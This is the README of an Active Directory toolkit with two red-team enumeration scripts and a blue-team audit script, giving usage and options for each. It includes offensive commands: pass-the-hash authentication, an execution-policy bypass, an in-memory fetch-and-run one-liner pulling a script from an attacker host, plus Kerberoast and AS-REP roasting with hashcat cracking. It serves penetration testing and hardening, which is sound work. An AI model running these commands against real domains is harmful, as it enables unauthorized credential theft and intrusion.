# ad-enum

Active Directory scripts for AD engagements — two **red-team enumeration**
scripts and one **blue-team hardening audit**. The enumeration scripts are
*enumeration-only*: every command is one you would type by hand, chained, with
each output saved to its own file and a ranked summary of what was found and
what to do next. The audit script is the defensive counterpart: same attack
surface, read-only, with a concrete **remediation** for every weakness.

| Script          | Team | Where it runs            | Needs credentials?                        | Tooling |
|-----------------|------|--------------------------|-------------------------------------------|---------|
| `ad-enum.sh`    | red  | Kali (remote, over LDAP) | Yes — a domain user (password or NT hash) | nxc / impacket / certipy / bloodhound-python |
| `ade.ps1`       | red  | On a domain-joined host  | No — reuses the current user's token       | Pure ADSI / .NET (AMSI-safe, nothing downloaded) |
| `ad-audit.ps1`  | blue | On a domain-joined host  | Any read account (more with an auditor)   | Pure ADSI / .NET (read-only, no tickets requested) |

Use `ad-enum.sh` when you already have a credential and are enumerating from
Kali. 
Use `ade.ps1` when you have a reverse shell as an unprivileged domain user
but **no password**. 
Use `ad-audit.ps1` as the defender: it inventories the same weaknesses the two
enumeration scripts hunt for and tells you how to close each one.

## `ad-enum.sh` — from Kali

```bash
./ad-enum.sh -i 192.168.50.70 -d corp.com
./ad-enum.sh -i 192.168.50.70 -d corp.com -u jdoe -p 'Password123'
./ad-enum.sh -i 192.168.50.70 -d corp.com -u jdoe -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

```
  -i <ip>        Domain Controller IP                       (required)
  -d <domain>    domain FQDN, e.g. corp.com                 (auto-detected if omitted)
  -u <user>      domain user for authenticated enumeration
  -p <pass>      password for -u
  -H <nthash>    NT hash instead of the password (pass-the-hash)
  -k <file>      username wordlist for kerbrute userenum
  -r <targets>   network for the local-admin sweep (default: the DC /24)
  -w <file>      wordlist for --crack        (default: /usr/share/wordlists/rockyou.txt)
  -o <dir>       output directory (default ./ad-enum-<domain>-<date>)
  -t <sec>       per-command timeout (default 180)
  --crack        crack collected AS-REP / Kerberoast hashes with hashcat + -w
  --no-bh        skip bloodhound-python collection
  --no-sweep     skip the local-admin sweep (single credential, no lockout risk)
  --no-spider    skip the share / SYSVOL file spider
  -h             this help
```

Expects on `PATH`: `nxc`, impacket suite, `certipy`, `bloodhound-python`, `kerbrute`, `hashcat`.

Install the dependencies with `pip install -r requirements.txt` (Python tools);
the apt packages and the `kerbrute` Go binary are listed in that file too.

## `ade.ps1` — on a domain-joined Windows host

```powershell
powershell -ep bypass -f ade.ps1
powershell -ep bypass -f ade.ps1 -OutDir C:\Users\Public\ade
# in-memory:
IEX(New-Object Net.WebClient).DownloadString('http://KALI/ade.ps1')
```

| Parameter   | Meaning |
|-------------|---------|
| `-OutDir`   | output folder (one file per check) |
| `-Domain`   | override the naming context, e.g. `corp.com` |
| `-SkipAcl`  | skip the ACL scan (the slowest part) |
| `-Roast`    | actively request TGS / AS-REP and dump crackable hashes |
| `-Quiet`    | summary only, no per-check lines |

## `ad-audit.ps1` — blue-team hardening audit (on a domain-joined host)

The defensive mirror of the two enumeration scripts. Read-only, pure ADSI/.NET,
**never requests a Kerberos ticket** (so it leaves no roast events) and never
writes to the directory — safe to run in production. For every weakness it
prints the offending objects and a `FIX:` line: the exact attribute to clear,
GPO to set, or command to run.

```powershell
powershell -ep bypass -f ad-audit.ps1
powershell -ep bypass -f ad-audit.ps1 -OutDir C:\Audit\ad
powershell -ep bypass -f ad-audit.ps1 -Domain corp.com -StaleDays 60
```

| Parameter     | Meaning |
|---------------|---------|
| `-OutDir`     | output folder (one file per check + `SUMMARY.txt`) |
| `-Domain`     | override the naming context, e.g. `corp.com` |
| `-StaleDays`  | inactivity threshold for stale users/computers (default 90) |
| `-KrbtgtDays` | flag the krbtgt password older than this (default 180) |
| `-SkipAcl`    | skip the domain-wide DACL scan (DCSync / AdminSDHolder) |
| `-Quiet`      | summary only, no per-check lines |

What it checks (each with a remediation): password/lockout policy, reversible
encryption, krbtgt age, AS-REP roastable and kerberoastable accounts, RC4-vs-AES
on service accounts, unconstrained/constrained/RBCD delegation,
`MachineAccountQuota`, non-default DCSync and AdminSDHolder rights, LAPS
coverage, ADCS certificate templates vulnerable to ESC1, `PASSWD_NOTREQD`,
password-never-expires, cleartext passwords in `description`, privileged-group
membership, orphaned `adminCount`, Protected Users usage, stale users/computers,
Guest account state, trusts (SID filtering), and domain functional level.

Run it with a read-only auditor account for most checks; run it **on a DC** (or
with an account that can read the relevant DACLs) to get the DCSync and
AdminSDHolder findings. Re-run after each fix to confirm the finding clears.

## License

[MIT](LICENSE)
